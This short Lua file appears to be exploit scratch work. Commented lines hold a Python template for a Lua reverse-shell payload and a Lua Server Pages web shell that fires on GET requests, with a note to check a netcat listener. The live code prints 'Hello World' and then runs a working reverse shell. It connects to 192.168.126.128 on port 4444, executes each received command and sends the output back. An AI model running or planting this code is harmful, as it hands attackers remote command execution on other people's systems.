-- shell = f'local host, port = "{LHOST}", {LPORT} \nlocal socket = require("socket")\nlocal tcp = socket.tcp() \nlocal io = require("io") tcp:connect(host, port); \n while 						true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'


-- #Change the shell if you want to, when tested I've had the best luck with lua rev shell code so thats what I put as default 
--     shell = f'local host, port = "{LHOST}", {LPORT} \nlocal socket = require("socket")\nlocal tcp = socket.tcp() \nlocal io = require("io") tcp:connect(host, port); \n while 						true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'


-- <h2> Check ur nc listener on the port you put in <h2>

-- <?lsp if request:method() == "GET" then ?>
--     <?lsp 
--     local host, port = "192.168.126.128", 4444 
-- local socket = require("socket")
-- local tcp = socket.tcp() 
-- local io = require("io") tcp:connect(host, port); 
-- while 						true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()		
--     ?>
-- <?lsp else ?>
--     Wrong request method, goodBye! 
-- <?lsp end ?>




print("Hello World")

print("Hello World")
local host, port = "192.168.126.128", 4444 
local socket = require("socket")
local tcp = socket.tcp() 
local io = require("io") tcp:connect(host, port); 
while 						true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()		